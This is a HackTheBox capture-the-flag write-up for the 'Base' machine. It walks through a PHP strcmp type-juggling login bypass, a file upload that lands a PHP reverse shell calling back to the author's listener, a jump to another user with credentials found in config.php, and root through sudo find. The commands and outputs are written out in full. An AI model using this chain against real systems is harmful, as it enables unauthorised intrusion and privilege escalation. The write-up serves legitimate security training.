![Image LOGO](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/base.png)

## ------------>> Base <<----------------

// We start with nmap scan

    $ nmap -sC -sV -A -Pn 10.10.10.48 -p-
-----    
    
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-02 21:35 EDT
    Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 7.28% done; ETC: 21:55 (0:18:53 remaining)
    Nmap scan report for 10.10.10.48
    Host is up (0.37s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 f6:5c:9b:38:ec:a7:5c:79:1c:1f:18:1c:52:46:f7:0b (RSA)
    |   256 65:0c:f7:db:42:03:46:07:f2:12:89:fe:11:20:2c:53 (ECDSA)
    |_  256 b8:65:cd:3f:34:d8:02:6a:e3:18:23:3e:77:dd:87:40 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Site doesn't have a title (text/html).
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


// Nvigatin to http://10.10.10.48/ we got some website that have a login page


![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/1.png)


// Due to miscunfigiration of the develepo we could access the directory from http://10.10.10.48/login/  

// There we can see file login.pgp.swp


![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/2.png)


// In the file we can see block of code


    $ cat login.php.sw
-----

    </html></body><script src="assets/js/main.js"></script><script src="assets/js/util.js"></script><script src="assets/js/breakpoints.min.js"></script><script src="assets/js/browser.min.js"></script><script src="assets/js/jquery.poptrox.min.js"></script><script src="assets/js/jquery.min.js"></script><!-- Scripts --></div>    </div>        </div>            </form>                </ul>                    </li>                        <button class="button" type="submit" value="Submit">Login</button>                    <li>                <ul>                </ul>                    <li><input type="password" name="password" id="password"></li>                    <li><input type="text" name="username" id="username"></li>                <ul>            <form id="login-form" method="POST" action="" onsubmit="">        <div id="menu">        </div>            <h1><a href="index.php">Base</a></h1>        <div id="logo">    <div id="header" class="container"><div id="header-wrapper"><!-- Main --><!-- Wrapper --><body></head>    <link href="default_ie6.css" rel="stylesheet" type="text/css"/><![endif]-->    <!--[if IE 6]>    <link href="fonts.css" rel="stylesheet" type="text/css" media="all"/>    <link href="default.css" rel="stylesheet" type="text/css" media="all"/>    <link href="http://fonts.googleapis.com/css?family=Source+Sans+Pro:200,300,400,600,700,900" rel="stylesheet"/>    <meta name="description" content=""/>    <meta name="keywords" content=""/>    <title>Base Login</title>    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><head><html xmlns="http://www.w3.org/1999/xhtml"><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">?>}    }        print("<script>alert('Wrong Username or Password')</script>");    } else {        }            print("<script>alert('Wrong Username or Password')</script>");        } else {            header("Location: upload.php");            $_SESSION['user_id'] = 1;        if (strcmp($password, $_POST['password']) == 0) {    if (strcmp($username , $_POST['username']) == 0) {    require('config.php');if (!empty($_POST['username']) && !empty($_P


// it seems that its the authentication mehod for the login


    if (strcmp($password, $_POST['password']) == 0) 
    if (strcmp($username , $_POST['username']) == 0)


// Developer uses strcmp to check username and password, whitch its insecure and can be easilly bypass

// due to the fact that if strcmp is given an empty array to compare againts the stored password, it retuens null.

// in PHP the == operator only checks the value of a viriable for equality and the value of null is equal to 0.

// the correct way to write this its using === which checks both the value and type.

// lets open burp and catch the login packet


![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/3.png)


// Now lets send another login but this time we will edit the request in BurpSuite proxy

// edit to last line and send

    username[]=test&password[]=test

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/4.png)


// We got redirect to http://10.10.10.48/upload.php , where we can upload files


![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/5.png)


// when upload file its send us succcess but where the file?... lets run gobuster

    $ gobuster dir -u http://10.10.10.48/ -w /usr/share/wordlists/dirb/big.txt -q -n -e
-----    
    
    http://10.10.10.48/.htaccess            [Size: 276]
    http://10.10.10.48/.htpasswd            [Size: 276]
    http://10.10.10.48/_uploaded            [Size: 314] [--> http://10.10.10.48/_uploaded/]


// lets test if and upload some file and call him

    $ touch 1 > test.txt

// Upload test.txt and navigate to http://10.10.10.48/_uploaded/test.txt , it works!


![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/6.png)


// lets upload php reverse shell (u can either cp or download from ![here](https://www.revshells.com/))

    $ cp /usr/share/laudanum/php/php-reverse-shell.php php_rshell.php
// editing the file with our ip and port

    ...
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '10.10.16.14';  // CHANGE THIS
    $port = 1444;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;
    ...

// open a listiner with nc

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
 
 // and navigate to 10.10.10.48/_uploaded/php_rshell.php
 
    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.14] from (UNKNOWN) [10.10.10.48] 40934
    Linux base 4.15.0-88-generic #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
     06:15:16 up 13:43,  0 users,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)


// lets promote shell using python

    python3 -c "import pty;pty.spawn('/bin/bash')"


// Searching in the /var/www/html/login/ directory, found file config.php

    www-data@base:/var/www/html/login$ cat config.php
    cat config.php
    <?php
    $username = "admin";
    $password = "thisisagoodpassword";
    ...

// we found user john in etc/passwd

    www-data@base:/etc$ cat passwd
    ......................................................
    john:x:1000:1000:John:/home/john:/bin/bash
    ................................................

// Try connect johb user with password: hisisagoodpassword

    www-data@base:/$ su john
    su john
    password: thisisagoodpassword

    john@base:/$ id
    uid=1000(john) gid=1000(john) groups=1000(john)
    
// It Worked! 

// We got user flag!

    john@base:~$ cat user.txt
    cat user.txt
    f54846c258f3b4612f78a819573d158e


## ----Privilliges Escalation----


// running sudo -l for checking which files we can run with root permission we got 'find'


    john@base:~$ sudo -l
    sudo -l
    [sudo] password for john: thisisagoodpassword

    Matching Defaults entries for john on base:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User john may run the following commands on base:
        (root : root) /usr/bin/find


// lets abuse 'find' command for root privilleges 


    john@base:~$ sudo find . -exec /bin/sh \; -quit
    sudo find . -exec /bin/sh \; -quit
    
    # whoami
    whoami
    root


// Lets promote root shell with python

    # python3 -c "import pty;pty.spawn('/bin/bash')"
    python3 -c "import pty;pty.spawn('/bin/bash')"
    root@base:/home# 
-----

// We got root flag !

    root@base:/root# cat root.txt
    cat root.txt
    51709519ea18.................

